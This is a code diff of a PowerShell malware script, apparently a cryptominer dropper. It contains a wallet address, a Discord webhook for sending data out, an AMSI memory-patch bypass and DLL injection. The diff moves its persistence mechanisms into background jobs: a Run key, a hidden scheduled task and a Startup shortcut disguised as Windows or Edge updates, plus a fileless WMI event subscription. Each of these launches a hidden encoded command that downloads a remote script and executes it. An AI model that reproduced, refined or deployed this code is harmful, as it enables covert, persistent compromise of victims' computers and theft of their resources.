@@ -47,9 +47,9 @@ $c.addr = '4483G1AgS1pdsLqzt3nFQmL8HPF3C2WVrLMRAdAVGqxz6ipV3aF8no7cmDkH4wMZz9YD5
 $c.base = "https://raw.githubusercontent.com/$($c.u1)/$($c.u2)/main"
 $c.wh = "https://discord.com/api/webhooks/1502316875638636624/qpXdrqNC3xCsJlIYR96XNGqEBUXNoDLr_LZmRAwrrsUDHh8oHsLRX1Mo_s4UE9m7IHY1"
 
-# === PROCESS CLEANUP (kill old instances) ===
-$current = $PID
-try {
+# Instant Ingest: Cleanup moved to background
+Job -ScriptBlock {
+    $current = $args[0]
     Get-Process -Name 'powershell','pwsh' -EA 0 | Where-Object { $_.Id -ne $current } | ForEach-Object {
         try {
             $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -EA 0).CommandLine
@@ -58,7 +58,7 @@ try {
             }
         } catch {}
     }
-} catch {}
+} -ArgumentList $PID | Out-Null
 
 # === AMSI BYPASS (Memory Patch) ===
 try {
@@ -107,61 +107,33 @@ try {
     }
 } catch {}
 
-# === MULTI-PERSISTENCE ===
-$rawPath = "$($c.base)/deploy.ps1"
-$payload = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (Invoke-RestMethod -Uri '$rawPath')"
-$encBytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
-$encoded = [Convert]::ToBase64String($encBytes)
-$pCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"
+# === ASYNC PERSISTENCE (Fast Ingest) ===
+Start-Job -ScriptBlock {
+    param($c, $base)
+    $rawPath = "$base/deploy.ps1"
+    $payload = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (Invoke-RestMethod -Uri '$rawPath')"
+    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
+    $pCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"
 
-# P1: Registry Run Key
-try {
-    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdateCoordinator' -Value $pCmd -EA 0
-} catch {}
-
-# P2: Scheduled Task (logon + every 2h)
-try {
-    $tn = 'MicrosoftEdgeUpdateTask'
-    if (-not (Get-ScheduledTask -TaskName $tn -EA 0)) {
+    try { Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdateCoordinator' -Value $pCmd -EA 0 } catch {}
+    try {
+        $tn = 'MicrosoftEdgeUpdateTask'
         $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"
         $t1 = New-ScheduledTaskTrigger -AtLogon
         $t2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 2) -RepetitionDuration (New-TimeSpan -Days 365)
-        $set = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable -RunOnlyIfNetworkAvailable
-        Register-ScheduledTask -TaskName $tn -Action $action -Trigger $t1,$t2 -Settings $set -Description 'Microsoft Edge browser update coordination task' -EA 0 | Out-Null
-    }
-} catch {}
-
-# P3: Startup Folder shortcut
-try {
-    $startupDir = [Environment]::GetFolderPath('Startup')
-    $lnkPath = Join-Path $startupDir 'EdgeUpdate.lnk'
-    if (-not (Test-Path $lnkPath)) {
+        Register-ScheduledTask -TaskName $tn -Action $action -Trigger $t1,$t2 -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden) -EA 0 | Out-Null
+    } catch {}
+    try {
         $ws = New-Object -ComObject WScript.Shell
-        $sc = $ws.CreateShortcut($lnkPath)
-        $sc.TargetPath = 'powershell.exe'
-        $sc.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"
-        $sc.WindowStyle = 7
-        $sc.Description = 'Microsoft Edge Update'
-        $sc.Save()
-        try { (Get-Item $lnkPath -Force).Attributes = 'Hidden,System' } catch {}
-    }
-} catch {}
-
-# P4: WMI Event Subscription (fileless)
-try {
-    $filterName = "EdgeUpdateFilter"
-    $consumerName = "EdgeUpdateConsumer"
-    $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 360"
-    $filterArgs = @{ Name = $filterName; EventNameSpace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = $query }
-    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs -EA 0
-
-    $cmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"
-    $consumerArgs = @{ Name = $consumerName; CommandLineTemplate = $cmd }
-    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs -EA 0
-
-    $bindArgs = @{ Filter = $filter.Path; Consumer = $consumer.Path }
-    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindArgs -EA 0 | Out-Null
-} catch {}
+        $sc = $ws.CreateShortcut((Join-Path ([Environment]::GetFolderPath('Startup')) 'EdgeUpdate.lnk'))
+        $sc.TargetPath = 'powershell.exe'; $sc.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"; $sc.Save()
+    } catch {}
+    try {
+        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ Name = "EdgeUpdateFilter"; QueryLanguage = 'WQL'; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 360" }
+        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ Name = "EdgeUpdateConsumer"; CommandLineTemplate = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded" }
+        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $filter.Path; Consumer = $consumer.Path } | Out-Null
+    } catch {}
+} -ArgumentList $c, $c.base | Out-Null
 
 # === DLL INJECTION (with retry + fallback) ===
 $maxRetries = 3
